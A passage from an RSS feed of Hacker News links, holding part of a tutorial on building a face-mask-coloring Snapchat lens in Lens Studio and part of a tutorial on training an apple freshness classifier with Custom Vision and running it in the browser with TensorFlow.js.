https://miro.medium.com/max/1280/1*KN4GH982T9ZMnpICeiqvAQ.png 640w, https://miro.medium.com/max/1332/1*KN4GH982T9ZMnpICeiqvAQ.png 666w" sizes="666px" data-old-src="https://miro.medium.com/max/44/1*KN4GH982T9ZMnpICeiqvAQ.png?q=20"></p></div></div></figure><p id="81d0">Now that we have our trained model and a test image loaded into Lens Studio, let’s hook everything up so we can pass our image through the model, generate predictions, and visualize the results.</p><h2 id="a160">Part 3.1: Visualizing mask predictions</h2><p id="8af8">In this section, I’ll show you how to make a basic, non-interactive version of the face mask coloring lens.</p><p id="e633"><strong>1. Configure ML Component input and output textures.</strong> Select the ML Component in the Objects panel, and it should appear in the Inspector panel (located to the left of the Preview panel). Near the bottom of the Inspector panel, set the input texture to Device Camera Texture. At the bottom of the panel, click the Create Output Texture button. This texture will now be available in the Resources panel (bottom left). Feel free to rename it — I’m calling mine Face Mask Model Output Texture.</p><figure><div><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/1460/1*3dcion_DECe6hvQNwSKS-g.png" width="730" height="894" srcset="https://miro.medium.com/max/552/1*3dcion_DECe6hvQNwSKS-g.png 276w, https://miro.medium.com/max/1104/1*3dcion_DECe6hvQNwSKS-g.png 552w, https://miro.medium.com/max/1280/1*3dcion_DECe6hvQNwSKS-g.png 640w, https://miro.medium.com/max/1400/1*3dcion_DECe6hvQNwSKS-g.png 700w" sizes="700px" data-old-src="https://miro.medium.com/max/48/1*3dcion_DECe6hvQNwSKS-g.png?q=20"></p></div></div></div></figure><p id="07c9"><strong>2. Add a Screen Image object</strong>. Next, we need to add a Screen Image object (the same way we added the ML Component — click the + sign in the Objects panel). That should appear nested under an Orthographic Camera object, which we’ll rename to Mask Orthographic Camera, because we’ll need another Orthographic Camera object later, for the UI.</p><figure><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/1144/1*C_U72_LoIjeanXVa4tJmQA.png" width="572" height="122" srcset="https://miro.medium.com/max/552/1*C_U72_LoIjeanXVa4tJmQA.png 276w, https://miro.medium.com/max/1104/1*C_U72_LoIjeanXVa4tJmQA.png 552w, https://miro.medium.com/max/1144/1*C_U72_LoIjeanXVa4tJmQA.png 572w" sizes="572px" data-old-src="https://miro.medium.com/max/60/1*C_U72_LoIjeanXVa4tJmQA.png?q=20"></p></div></div></figure><p id="9713"><strong>3. Create a material in the Material Editor</strong>. To process the model output, we need to make a material in the Material Editor. The material will let us control where a solid color overlay is displayed on the screen. We’ll use the model’s prediction at each pixel to determine the transparency of the color overlay: it will be more opaque where the model is more confident, and more transparent where the model is less confident. To get started, add a Graph Empty material in the Resources panel:</p><figure><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/1132/1*RJISm51tjiTJRI6e17qOHA.png" width="566" height="312" srcset="https://miro.medium.com/max/552/1*RJISm51tjiTJRI6e17qOHA.png 276w, https://miro.medium.com/max/1104/1*RJISm51tjiTJRI6e17qOHA.png 552w, https://miro.medium.com/max/1132/1*RJISm51tjiTJRI6e17qOHA.png 566w" sizes="566px" data-old-src="https://miro.medium.com/max/60/1*RJISm51tjiTJRI6e17qOHA.png?q=20"></p></div></div></figure><p id="f68a">Double click on your new Graph Empty material to open it in the Material Editor. Feel free to check out the <a href="https://lensstudio.snapchat.com/guides/material-editor/introduction-and-concepts/" target="_blank" rel="noopener">Lens Studio Material Editor documentation</a> for an in-depth explanation of the underlying concepts, but the basic idea is that we’re making a graph (you can think of it as a function) whose inputs are:</p><ol><li id="767e">The segmentation model output</li><li id="b82c">The color of the color overlay</li><li id="1e35">The maximum alpha (opacity) value</li></ol><p id="f96a">The output of the graph is a shader node, which in our case controls the color and transparency of every pixel in our color overlay.</p><p id="d2c5">To add nodes to the graph, click the + button and search for the node type:</p><figure><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/1144/1*OkAdCqvxnnlCf9Hdd0Vqsg.png" width="572" height="290" srcset="https://miro.medium.com/max/552/1*OkAdCqvxnnlCf9Hdd0Vqsg.png 276w, https://miro.medium.com/max/1104/1*OkAdCqvxnnlCf9Hdd0Vqsg.png 552w, https://miro.medium.com/max/1144/1*OkAdCqvxnnlCf9Hdd0Vqsg.png 572w" sizes="572px" data-old-src="https://miro.medium.com/max/60/1*OkAdCqvxnnlCf9Hdd0Vqsg.png?q=20"></p></div></div></figure><p id="3ce7">Here is the complete structure of the graph:</p><figure><div><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/4292/1*eOZhIcdf78SvOXzD01ByIg.png" width="2146" height="972" srcset="https://miro.medium.com/max/552/1*eOZhIcdf78SvOXzD01ByIg.png 276w, https://miro.medium.com/max/1104/1*eOZhIcdf78SvOXzD01ByIg.png 552w, https://miro.medium.com/max/1280/1*eOZhIcdf78SvOXzD01ByIg.png 640w, https://miro.medium.com/max/1400/1*eOZhIcdf78SvOXzD01ByIg.png 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*eOZhIcdf78SvOXzD01ByIg.png?q=20"></p></div></div></div></figure><p id="dda8">There’s quite a bit going on here—probably enough for a separate blog post— but for now I’ll go over the essential parts and give you a link to <a href="https://bit.ly/2FFfhVq" target="_blank" rel="noopener">download the material</a> (<em>link initiates a download</em>) and drop it into your project so you don’t have to make it from scratch.</p><p id="4386">The Float Parameter node controls the maximum opacity of the color overlay. Setting this value to 0.6–0.7 worked well for my use case because it allows for some of the details of the face masks to come through.</p><p id="88c7">The Texture 2D Parameter node takes in the model output. My model has two output channels: one for a background class, and one for face masks. Having two channels is redundant for segmenting a single class of objects, but Fritz AI Studio produces models with a background class because it offers the flexibility of training models that can segment multiple classes of objects separately.</p><p id="beaa">So, for our material, we just need to grab the second channel of the model output using a Swizzle node. Finally, the Color Parameter node takes in a color as input. For now, we’ll have to select a color manually, but eventually we’ll hook this up to the color slider UI element.</p><p id="87d8">Both the Texture 2D Parameter and Color Parameter nodes are exposed to custom scripts — more on that in Step 3 of the next section.</p><p id="4942"><strong>4. Connect the model output texture</strong>. Now that we have the material graph set up, we need to connect the model output texture. Select the material in the Resources panel, and you should see Graph Parameters in the Inspector panel. Under Graph Parameters, set the Model Output parameter as the model output texture created in Step 1 above.</p><figure><div><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/1464/1*7-1QMWkTev7aeD_1fD2N2w.png" width="732" height="862" srcset="https://miro.medium.com/max/552/1*7-1QMWkTev7aeD_1fD2N2w.png 276w, https://miro.medium.com/max/1104/1*7-1QMWkTev7aeD_1fD2N2w.png 552w, https://miro.medium.com/max/1280/1*7-1QMWkTev7aeD_1fD2N2w.png 640w, https://miro.medium.com/max/1400/1*7-1QMWkTev7aeD_1fD2N2w.png 700w" sizes="700px" data-old-src="https://miro.medium.com/max/50/1*7-1QMWkTev7aeD_1fD2N2w.png?q=20"></p></div></div></div></figure><p id="ae68"><strong>5. Configure the Screen Image component.</strong> Set the Material as the segmentation material from Step 3, set the Texture to the model output texture from Step 1, and set the Stretch Mode to Stretch.</p><figure><div><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/1464/1*5gKgbsB1DJfsvAJlBGDjfQ.png" width="732" height="510" srcset="https://miro.medium.com/max/552/1*5gKgbsB1DJfsvAJlBGDjfQ.png 276w, https://miro.medium.com/max/1104/1*5gKgbsB1DJfsvAJlBGDjfQ.png 552w, https://miro.medium.com/max/1280/1*5gKgbsB1DJfsvAJlBGDjfQ.png 640w, https://miro.medium.com/max/1400/1*5gKgbsB1DJfsvAJlBGDjfQ.png 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*5gKgbsB1DJfsvAJlBGDjfQ.png?q=20"></p></div></div></div></figure><p id="e6b9">At this point, you should be able to see your model’s predictions! Try selecting the mask material in the Resources panel and playing with the Mask Color and Segmentation Mask Alpha parameters (which control the transparency of the color overlay) in the Inspector panel.</p><figure><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/1200/1*ILdNjJ5ciZtY8uji4yyHSw.gif" width="600" height="353" srcset="https://miro.medium.com/max/552/1*ILdNjJ5ciZtY8uji4yyHSw.gif 276w, https://miro.medium.com/max/1104/1*ILdNjJ5ciZtY8uji4yyHSw.gif 552w, https://miro.medium.com/max/1200/1*ILdNjJ5ciZtY8uji4yyHSw.gif 600w" sizes="600px" data-old-src="https://miro.medium.com/freeze/max/60/1*ILdNjJ5ciZtY8uji4yyHSw.gif?q=20"></p></div></div></figure><h2 id="c24a">Part 3.2: Adding a Color Slider</h2><p id="051e">Let’s spice things up a bit and add an interactive UI element that will let users pick the color of the face mask overlay.</p><p id="1679"><strong>1. Create another Orthographic Camera.</strong> The easiest way to do this is to duplicate the Mask Orthographic Camera (right click &gt; Duplicate) and then delete the Full Frame Region 0 under the new camera. Let’s rename it to Slider Orthographic Camera while we’re at it.</p><figure><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/1152/1*am1QObsCH4GYTGjh3ZGcXA.gif" width="576" height="554" srcset="https://miro.medium.com/max/552/1*am1QObsCH4GYTGjh3ZGcXA.gif 276w, https://miro.medium.com/max/1104/1*am1QObsCH4GYTGjh3ZGcXA.gif 552w, https://miro.medium.com/max/1152/1*am1QObsCH4GYTGjh3ZGcXA.gif 576w" sizes="576px" data-old-src="https://miro.medium.com/freeze/max/60/1*am1QObsCH4GYTGjh3ZGcXA.gif?q=20"></p></div></div></figure><p id="fdf5"><strong>2. Implement the Slider.</strong> Follow the instructions <a href="https://lensstudio.snapchat.com/guides/scripting/helper-scripts/user-interface/" target="_blank" rel="noopener">here</a> (make sure to use the Slider Orthographic Camera from Step 1) to get UI elements into your project. Once you have the UI pieces in your project, you can delete the Tap Hint and everything nested under UI Panel, except for the UI Color Picker. Your object hierarchy should look like this:</p><figure><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/1152/1*XHPK4lfMfgUB5ZMrAG3aAw.png" width="576" height="554" srcset="https://miro.medium.com/max/552/1*XHPK4lfMfgUB5ZMrAG3aAw.png 276w, https://miro.medium.com/max/1104/1*XHPK4lfMfgUB5ZMrAG3aAw.png 552w, https://miro.medium.com/max/1152/1*XHPK4lfMfgUB5ZMrAG3aAw.png 576w" sizes="576px" data-old-src="https://miro.medium.com/max/60/1*XHPK4lfMfgUB5ZMrAG3aAw.png?q=20"></p></div></div></figure><p id="f112"><strong>3. Modify the UI Color Picker component.</strong> Open the UIColorPicker script found in the Resources panel under UI &gt; Resources &gt; Scripts, and change line 48 from</p><p id="e640"><code>//@input <strong>Component.MeshVisual</strong> colorRecipient</code></p><p id="c529">to</p><p id="4df3"><code>//@input <strong>Asset.Material</strong> colorRecipient</code></p><p id="1aab">And change line 652 from</p><p id="09e3"><code>script.colorRecipient.mainPass.<strong>baseColor</strong> = currentColor;</code></p><p id="2d96">to</p><p id="10d4"><code>script.colorRecipient.mainPass.<strong>maskColor</strong> = currentColor;</code></p><p id="ea4b">Note that <code><strong>maskColor</strong></code><strong> </strong>is the name we gave to the Color Parameter input node in the Face Mask Segmentation Material graph from Step 3 of the previous section.</p><p id="8093">These code changes enable us to connect the color slider to our face mask color overlay. Select the UI Color Picker in the Objects panel and assign the segmentation material from Step 3 in the previous section:</p><figure><div><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/1460/1*SM3M4qwrIZeEvggJRA8ttg.png" width="730" height="482" srcset="https://miro.medium.com/max/552/1*SM3M4qwrIZeEvggJRA8ttg.png 276w, https://miro.medium.com/max/1104/1*SM3M4qwrIZeEvggJRA8ttg.png 552w, https://miro.medium.com/max/1280/1*SM3M4qwrIZeEvggJRA8ttg.png 640w, https://miro.medium.com/max/1400/1*SM3M4qwrIZeEvggJRA8ttg.png 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*SM3M4qwrIZeEvggJRA8ttg.png?q=20"></p></div></div></div></figure><p id="00bb"><strong>4. Organize the various components into two layers.</strong> Let’s put the color overlay components in one layer and the color slider components in another layer, so we can control when those layers appear in our Lens. This allows us to display the color overlay at all times and only show the color slider in capture mode. Everything under Mask Orthographic Camera should go in a layer called “Mask”, and everything under the Slider Orthographic Camera should go in a layer called “Slider”.</p><figure><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/1160/1*9fFhcg8CRLGmLMLVBc_wYA.gif" width="580" height="718" srcset="https://miro.medium.com/max/552/1*9fFhcg8CRLGmLMLVBc_wYA.gif 276w, https://miro.medium.com/max/1104/1*9fFhcg8CRLGmLMLVBc_wYA.gif 552w, https://miro.medium.com/max/1160/1*9fFhcg8CRLGmLMLVBc_wYA.gif 580w" sizes="580px" data-old-src="https://miro.medium.com/freeze/max/48/1*9fFhcg8CRLGmLMLVBc_wYA.gif?q=20"></p></div></div></figure><p id="0d43">Make sure you expand the UI Panel component and assign everything under that to the “Slider” layer, as well:</p><figure><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/1160/1*BqZpeRQ0a3iRcXBMkdBu-Q.png" width="580" height="616" srcset="https://miro.medium.com/max/552/1*BqZpeRQ0a3iRcXBMkdBu-Q.png 276w, https://miro.medium.com/max/1104/1*BqZpeRQ0a3iRcXBMkdBu-Q.png 552w, https://miro.medium.com/max/1160/1*BqZpeRQ0a3iRcXBMkdBu-Q.png 580w" sizes="580px" data-old-src="https://miro.medium.com/max/56/1*BqZpeRQ0a3iRcXBMkdBu-Q.png?q=20"></p></div></div></figure><p id="817b"><strong>5. Organize render targets in the Scene Config.</strong> This step enables us to display the color slider UI element in live mode when recording a Snap, but have it disappear in capture mode before sending the snap. We’ll set this up in the Scene Config panel. The Scene Config panel lives behind the Resources panel in the lower left. Click on Scene Config so it’s visible.</p><figure><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/1312/1*tLXxC8ff_K9883vGElCCDw.png" width="656" height="142" srcset="https://miro.medium.com/max/552/1*tLXxC8ff_K9883vGElCCDw.png 276w, https://miro.medium.com/max/1104/1*tLXxC8ff_K9883vGElCCDw.png 552w, https://miro.medium.com/max/1280/1*tLXxC8ff_K9883vGElCCDw.png 640w, https://miro.medium.com/max/1312/1*tLXxC8ff_K9883vGElCCDw.png 656w" sizes="656px" data-old-src="https://miro.medium.com/max/60/1*tLXxC8ff_K9883vGElCCDw.png?q=20"></p></div></div></figure><p id="75c5">In the Scene Config, click on the Render Target button to the right of Capture Target. In the window that pops up, rename Render Target to Capture Render Target, and make a new Render Target called Live Render Target.</p><figure><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/1200/1*BVjL-XbwUKOgqev8QVlejg.gif" width="600" height="449" srcset="https://miro.medium.com/max/552/1*BVjL-XbwUKOgqev8QVlejg.gif 276w, https://miro.medium.com/max/1104/1*BVjL-XbwUKOgqev8QVlejg.gif 552w, https://miro.medium.com/max/1200/1*BVjL-XbwUKOgqev8QVlejg.gif 600w" sizes="600px" data-old-src="https://miro.medium.com/freeze/max/60/1*BVjL-XbwUKOgqev8QVlejg.gif?q=20"></p></div></div></figure><p id="9f50">Back in the Scene Config, set the Capture Target to Capture Render Target, and set the Live Target to Live Render Target.</p><figure><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/1308/1*ISBZNSlPIGsR6gjmPEbq6g.png" width="654" height="146" srcset="https://miro.medium.com/max/552/1*ISBZNSlPIGsR6gjmPEbq6g.png 276w, https://miro.medium.com/max/1104/1*ISBZNSlPIGsR6gjmPEbq6g.png 552w, https://miro.medium.com/max/1280/1*ISBZNSlPIGsR6gjmPEbq6g.png 640w, https://miro.medium.com/max/1308/1*ISBZNSlPIGsR6gjmPEbq6g.png 654w" sizes="654px" data-old-src="https://miro.medium.com/max/60/1*ISBZNSlPIGsR6gjmPEbq6g.png?q=20"></p></div></div></figure><p id="053a">Make sure that the render target for the Mask Orthographic Camera is set to Capture Render Target, and that the render target for the Slider Orthographic Camera is set to Live Render Target.</p></div></div><div><p id="0b02">Finally, set the input texture of the Capture Render Target to be the Device Camera Texture, and set the input texture of the Live Render Target to be the Capture Render Target.</p></div><div><div><p id="0546">Let’s test out our new lens on a phone! You …</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://heartbeat.fritz.ai/building-a-custom-face-mask-snapchat-lens-with-fritz-ai-and-lens-studio-ba541b8ca5ae">https://heartbeat.fritz.ai/building-a-custom-face-mask-snapchat-lens-with-fritz-ai-and-lens-studio-ba541b8ca5ae</a></em></p>]]>
            </description>
            <link>https://heartbeat.fritz.ai/building-a-custom-face-mask-snapchat-lens-with-fritz-ai-and-lens-studio-ba541b8ca5ae</link>
            <guid isPermaLink="false">hacker-news-small-sites-24260588</guid>
            <pubDate>Mon, 24 Aug 2020 13:47:39 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Future of Remote Work]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24260385">thread link</a>) | @UtopiaFans
<br/>
August 24, 2020 | https://utopia.fans/networks/the-future-of-remote-work/ | <a href="https://web.archive.org/web/*/https://utopia.fans/networks/the-future-of-remote-work/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>https://utopia.fans/networks/the-future-of-remote-work/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24260385</guid>
            <pubDate>Mon, 24 Aug 2020 13:24:49 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Image Classification Made Easy in the Browser with Tensorflow.js]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24260374">thread link</a>) | @kris19100
<br/>
August 24, 2020 | https://heartbeat.fritz.ai/image-classification-made-easy-in-the-browser-with-tensorflow-js-82d016f603a8 | <a href="https://web.archive.org/web/*/https://heartbeat.fritz.ai/image-classification-made-easy-in-the-browser-with-tensorflow-js-82d016f603a8">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><div><div><h2 id="e958">Train model with Microsoft Custom Vision</h2><p id="83ff">Next, we need to train a custom model. Here, we have a service that’s easy to use, called Microsoft Custom Vision. Before we actually create our custom model, we must make sure that Cognitive Service on Azure is already set up and configured, as shown in the screenshot below:</p><figure><div><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/2520/1*mhK9ehIlNrmGibPUBG_Xag.png" width="1260" height="478" srcset="https://miro.medium.com/max/552/1*mhK9ehIlNrmGibPUBG_Xag.png 276w, https://miro.medium.com/max/1104/1*mhK9ehIlNrmGibPUBG_Xag.png 552w, https://miro.medium.com/max/1280/1*mhK9ehIlNrmGibPUBG_Xag.png 640w, https://miro.medium.com/max/1400/1*mhK9ehIlNrmGibPUBG_Xag.png 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*mhK9ehIlNrmGibPUBG_Xag.png?q=20"></p></div></div></div></figure><p id="c071">Next, we can go to the <a href="https://www.customvision.ai/" target="_blank" rel="noopener">Custom Vision</a> site and start by creating a new project, as directed in the screenshot below:</p><figure><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/1142/1*ApgTlZlFHvriICBWhvNq-Q.png" width="571" height="510" srcset="https://miro.medium.com/max/552/1*ApgTlZlFHvriICBWhvNq-Q.png 276w, https://miro.medium.com/max/1104/1*ApgTlZlFHvriICBWhvNq-Q.png 552w, https://miro.medium.com/max/1142/1*ApgTlZlFHvriICBWhvNq-Q.png 571w" sizes="571px" data-old-src="https://miro.medium.com/max/60/1*ApgTlZlFHvriICBWhvNq-Q.png?q=20"></p></div></div></figure><p id="d495">Next, we need to pick a <code>Food (compact)</code> model. If we do not pick ‘compact’ (i.e. lightweight and ready for edge deployment), then we won’t be able to export the model to our target platform:</p><figure><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/1110/1*hMW6TVEf0l4eV6BqkJDASg.png" width="555" height="427" srcset="https://miro.medium.com/max/552/1*hMW6TVEf0l4eV6BqkJDASg.png 276w, https://miro.medium.com/max/1104/1*hMW6TVEf0l4eV6BqkJDASg.png 552w, https://miro.medium.com/max/1110/1*hMW6TVEf0l4eV6BqkJDASg.png 555w" sizes="555px" data-old-src="https://miro.medium.com/max/60/1*hMW6TVEf0l4eV6BqkJDASg.png?q=20"></p></div></div></figure><p id="c79b">The first console configured page is shown in screenshot below:</p><figure><div><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/2172/1*KBHUs4FwjKCaopUfxDR1zg.png" width="1086" height="586" srcset="https://miro.medium.com/max/552/1*KBHUs4FwjKCaopUfxDR1zg.png 276w, https://miro.medium.com/max/1104/1*KBHUs4FwjKCaopUfxDR1zg.png 552w, https://miro.medium.com/max/1280/1*KBHUs4FwjKCaopUfxDR1zg.png 640w, https://miro.medium.com/max/1400/1*KBHUs4FwjKCaopUfxDR1zg.png 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*KBHUs4FwjKCaopUfxDR1zg.png?q=20"></p></div></div></div></figure><p id="45d7">As we can see in the console, our first step is to upload images to train our model on. We need to select and import the images that we downloaded from Kaggle. Once imported, we need to add a tag to classify the images. We do this first for the ‘rotten’ samples, as directed in the screenshot below:</p><figure><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/1114/1*qqMeX7UhoJ64VXCTDdxg0A.png" width="557" height="557" srcset="https://miro.medium.com/max/552/1*qqMeX7UhoJ64VXCTDdxg0A.png 276w, https://miro.medium.com/max/1104/1*qqMeX7UhoJ64VXCTDdxg0A.png 552w, https://miro.medium.com/max/1114/1*qqMeX7UhoJ64VXCTDdxg0A.png 557w" sizes="557px" data-old-src="https://miro.medium.com/max/60/1*qqMeX7UhoJ64VXCTDdxg0A.png?q=20"></p></div></div></figure><p id="f1eb">We also need to add the fresh apple images and add a tag to classify them as fresh:</p><figure><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/1078/1*GZdNkGDlPzksNbpJiBnIrw.png" width="539" height="572" srcset="https://miro.medium.com/max/552/1*GZdNkGDlPzksNbpJiBnIrw.png 276w, https://miro.medium.com/max/1078/1*GZdNkGDlPzksNbpJiBnIrw.png 539w" sizes="539px" data-old-src="https://miro.medium.com/max/56/1*GZdNkGDlPzksNbpJiBnIrw.png?q=20"></p></div></div></figure><p id="26bf">Once our classification labels are established and applied to our dataset, we can now move on and select the <strong>Training Type</strong>.</p><p id="538b">Here, we’re going to select the <strong>Quick Training</strong> option. We’re could pick the <strong>Advanced Training</strong> option, but it takes a longer period of time and more compute resources to train, and for our purposes, we don’t need anything that complex.</p><figure><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/1350/1*JjWMRUzAAAO-mEGOaTdymQ.png" width="675" height="472" srcset="https://miro.medium.com/max/552/1*JjWMRUzAAAO-mEGOaTdymQ.png 276w, https://miro.medium.com/max/1104/1*JjWMRUzAAAO-mEGOaTdymQ.png 552w, https://miro.medium.com/max/1280/1*JjWMRUzAAAO-mEGOaTdymQ.png 640w, https://miro.medium.com/max/1350/1*JjWMRUzAAAO-mEGOaTdymQ.png 675w" sizes="675px" data-old-src="https://miro.medium.com/max/60/1*JjWMRUzAAAO-mEGOaTdymQ.png?q=20"></p></div></div></figure><p id="5d70">After a half minute (with a small dataset and simple task, this won’t take long), our training will be complete, and we’ll get the following result in the interface:</p><figure><div><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/2210/1*mTQk-lLInIxla6N_viRGGQ.png" width="1105" height="521" srcset="https://miro.medium.com/max/552/1*mTQk-lLInIxla6N_viRGGQ.png 276w, https://miro.medium.com/max/1104/1*mTQk-lLInIxla6N_viRGGQ.png 552w, https://miro.medium.com/max/1280/1*mTQk-lLInIxla6N_viRGGQ.png 640w, https://miro.medium.com/max/1400/1*mTQk-lLInIxla6N_viRGGQ.png 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*mTQk-lLInIxla6N_viRGGQ.png?q=20"></p></div></div></div></figure><p id="ae53">Now that we’ve trained a (pretty accurate) model, we need to export it to our desired platform. We’re going to choose <strong>TensorFlow</strong> for this tutorial.</p><figure><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/1146/1*cRaU6w0gSiZwmvC4EsxaEQ.png" width="573" height="542" srcset="https://miro.medium.com/max/552/1*cRaU6w0gSiZwmvC4EsxaEQ.png 276w, https://miro.medium.com/max/1104/1*cRaU6w0gSiZwmvC4EsxaEQ.png 552w, https://miro.medium.com/max/1146/1*cRaU6w0gSiZwmvC4EsxaEQ.png 573w" sizes="573px" data-old-src="https://miro.medium.com/max/60/1*cRaU6w0gSiZwmvC4EsxaEQ.png?q=20"></p></div></div></figure><p id="59e9">After choosing the appropriate platform, we need to choose the platform module as well. Here, we’re going to pick <strong>TensorFlow.js</strong>, which is the browser-ready, JavaScript flavor of TensorFlow:</p><figure><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/1184/1*ipmNdPsdboRx7CQn08pDqg.png" width="592" height="378" srcset="https://miro.medium.com/max/552/1*ipmNdPsdboRx7CQn08pDqg.png 276w, https://miro.medium.com/max/1104/1*ipmNdPsdboRx7CQn08pDqg.png 552w, https://miro.medium.com/max/1184/1*ipmNdPsdboRx7CQn08pDqg.png 592w" sizes="592px" data-old-src="https://miro.medium.com/max/60/1*ipmNdPsdboRx7CQn08pDqg.png?q=20"></p></div></div></figure><p id="6c23">There it is! We’ve successfully created a simple model to classify and label fresh or rotten apples.</p></div></div></section><section><div><div><h2 id="bba5">Implementing on Browser</h2><p id="f59e">Next, we’re going to create a simple <a href="https://nodejs.org/en/" target="_blank" rel="noopener">Node.js</a> app to serve the model on a static, simple HTTP server. First, we’re going to create a <code>package.json</code> file using the following command:</p><pre><span id="d89a">npm init fresh_or_rotten</span></pre><p id="b70e">The folder structure for the web app is displayed below. Here, we’ve created a <code>./src</code> folder. We’ve copied our <code>./model</code> folder along with all the files inside it to the source folder.</p><figure><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/336/1*KQ111gnP9PqQcEaX-W-_oA.png" width="168" height="301" data-old-src="https://miro.medium.com/max/34/1*KQ111gnP9PqQcEaX-W-_oA.png?q=20"></p></div></div></figure><p id="ae27">Then, we need to create an <code>index.js</code> file, as shown in the screenshot above. Now, let's start to construct a page to display the classification results.</p><p id="df43">First, we add all the imports to the HTML head section, as shown in the code snippet below:</p><figure><div></div></figure><p id="041a">Second, we need to construct the body section. In the body section, we have a progress bar that we’re using to display model loading status. If the model load is complete, then the progress bar will disappear.</p><p id="1d2b">We also have a file picker and body area to display the picker image and classification result. The code to implement this provided in the code snippet below:</p><figure><div></div></figure><p id="7f88">Next, we add a script section in which we need to include JQuery, bootstrap and TensorFlow.js script links, as displayed in the code snippet below:</p><figure><div></div></figure><p id="072f">Here, we’ve got a file manager, editor, browser, and terminal on a single page.</p><p id="b3d5">Next, we head over to the <code>predict.js</code> file and start by creating a status variable named <code>Result</code>. We also create a function to handle the file picker and preview image, as shown in the code snippet below:</p><figure><div></div></figure><p id="09e8">We start by loading the model, showing the progress bar until the model successfully loads, and then we hide it. The code for this is provided below:</p><figure><div></div></figure><p id="5f0e">Our last step to implement a <code>predict</code> button. When a user clicks on this button, we start to pre-process the input image by resizing it and converting RGB values to BGR by reverse(-1). Then, we use the model to run inference (prediction) on the image.</p><p id="5948">Lastly, we can try to clean up the result by using <code>map</code>, <code>sort</code>, and <code>slice</code> functions.</p><p id="9ee2">In order to display the result, we’re going to create a simple list. The overall coding implementation for this is provided in the snippet below:</p><figure><div></div></figure><p id="6514">Next, we need to go to <code>index.js</code> file and create a simple server command to display the <code>index.html</code> file, as shown below:</p><figure><div></div></figure><p id="9b34">In order to start the server, we need to run the following command in the project terminal:</p><pre><span id="c95e">nodemon src/index.js</span></pre><p id="08ef">Hence, we should see the model load successfully:</p><figure><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/1258/1*2EGNWO08D3zXQoX4rxvP2A.gif" width="629" height="493" srcset="https://miro.medium.com/max/552/1*2EGNWO08D3zXQoX4rxvP2A.gif 276w, https://miro.medium.com/max/1104/1*2EGNWO08D3zXQoX4rxvP2A.gif 552w, https://miro.medium.com/max/1258/1*2EGNWO08D3zXQoX4rxvP2A.gif 629w" sizes="629px" data-old-src="https://miro.medium.com/freeze/max/60/1*2EGNWO08D3zXQoX4rxvP2A.gif?q=20"></p></div></div></figure><p id="9051">Next, we can choose a file and try to classify a fresh apple to see if the model has learned the training data:</p><figure><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/1238/1*JbiVAzWFx9BsVYQs96wcGQ.gif" width="619" height="588" srcset="https://miro.medium.com/max/552/1*JbiVAzWFx9BsVYQs96wcGQ.gif 276w, https://miro.medium.com/max/1104/1*JbiVAzWFx9BsVYQs96wcGQ.gif 552w, https://miro.medium.com/max/1238/1*JbiVAzWFx9BsVYQs96wcGQ.gif 619w" sizes="619px" data-old-src="https://miro.medium.com/freeze/max/60/1*JbiVAzWFx9BsVYQs96wcGQ.gif?q=20"></p></div></div></figure><p id="85b7">We can see that the result is 99% fresh and 0% rotten, which is the correct prediction.</p><p id="1e19">We can also try the same for a rotten apple:</p><figure><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/1212/1*byP0LI62KJ79aUpSKdcKyg.gif" width="606" height="571" srcset="https://miro.medium.com/max/552/1*byP0LI62KJ79aUpSKdcKyg.gif 276w, https://miro.medium.com/max/1104/1*byP0LI62KJ79aUpSKdcKyg.gif 552w, https://miro.medium.com/max/1212/1*byP0LI62KJ79aUpSKdcKyg.gif 606w" sizes="606px" data-old-src="https://miro.medium.com/freeze/max/60/1*byP0LI62KJ79aUpSKdcKyg.gif?q=20"></p></div></div></figure><p id="c49e">Now, we are going to perform testing using some random apple images from <a href="http://unsplash.com/" target="_blank" rel="noopener">Unsplash</a>. Hence, by taking a random apple image and providing it as input to our model gives the following result:</p><figure><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/1106/1*ZDhYu-HrhAZdTcdcdKUn4w.png" width="553" height="382" 